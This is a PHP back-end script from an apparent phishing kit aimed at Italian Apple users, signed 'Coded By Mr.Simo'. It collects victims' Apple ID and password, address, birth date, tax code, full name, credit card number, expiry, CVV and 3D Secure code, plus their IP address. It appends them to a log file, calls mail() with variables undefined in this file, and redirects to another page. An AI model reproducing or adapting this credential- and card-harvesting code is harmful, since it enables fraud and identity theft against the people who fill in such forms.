<?php
$ip = getenv("REMOTE_ADDR");
$A1= "------------+| Apple Spam ReZulT Italie |+------------\n";
$A= "Apple ID                    : ".$_POST['donnee000']."\n";
$B= "Password                    : ".$_POST['donnee001']."\n";
$C= "Adresse                     : ".$_POST['donneeco']."\n";
$D= "Zipcode                     : ".$_POST['donnee11']."\n";
$E= "Date of Birth               : ".$_POST['donnee02']."/".$_POST['donnee3']."/".$_POST['donnee4']."\n";
$F= "code fiscale                : ".$_POST['donneebq']."\n";
$G= "Full Name                   : ".$_POST['donnee01']."\n";
$H= "Number Of Credit Card       : ".$_POST['donnee5']."\n";
$I= "Expiration Date             : ".$_POST['donnee7']."/".$_POST['donnee8']."\n";
$J= "CVC (CVV)                   : ".$_POST['donnee6']."\n";
$K= "Code 3D                     : ".$_POST['donnee9']."\n";
$L = "--------------------------------------------------------------------------------\n";
$M = getenv("REMOTE_ADDR");
$N = "----------------------------- [ Coded By Mr.Simo ] -----------------------------\n";

$file			= fopen("../login.txt","a"); 
$data			.= $A1."<br>";
$data			.= $A."<br>";
$data			.= $B."<br>";
$data			.= $C."<br>";
$data			.= $D."<br>";
$data			.= $E."<br>";
$data			.= $F."<br>";
$data			.= $G."<br>";
$data			.= $H."<br>";
$data			.= $I."<br>";
$data			.= $J."<br>";
$data			.= $K."<br>";
$data			.= $L."<br>";
$data			.= $M."<br>";
$data			.= $N."<br>";

fwrite($file, $data);
fclose($file);
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);
header("Location: 3D.php");
?>

